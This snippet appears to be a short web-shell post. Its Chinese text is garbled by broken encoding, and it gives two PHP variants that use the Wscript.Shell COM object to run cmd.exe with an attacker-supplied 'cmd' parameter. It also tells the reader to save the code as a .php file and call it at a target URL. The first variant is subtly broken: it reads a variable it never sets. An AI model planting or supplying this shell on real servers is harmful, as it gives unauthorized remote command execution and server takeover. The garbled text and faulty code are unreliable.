�� ��
���³���(����)���ܴ��й����ԣ�������ȫ�о����ѧ֮�á�ʹ���߷����Ը���

/*��ҪWindows Script Host 5.6֧��*/
<?php
$phpwsh=new COM("Wscript.Shell") or die("Create Wscript.Shell Failed!");
$phpexec=$phpwsh->exec("cmd.exe /c $cmd");
$execoutput=$wshexec->stdout();
$result=$execoutput->readall();
echo $result;
?>

/*Windows Script Host 5.6���°汾֧��*/
<?php
$phpwsh=new COM("Wscript.Shell") or die("Create Wscript.Shell Failed!");
$phpwsh->run("cmd.exe /c $cmd > c://inetpub//wwwroot//result.txt");
?>

�����ϴ��뱣���*.php�ļ�֮��������������ִ��
http://www.target.com/simple.php?cmd=[Command]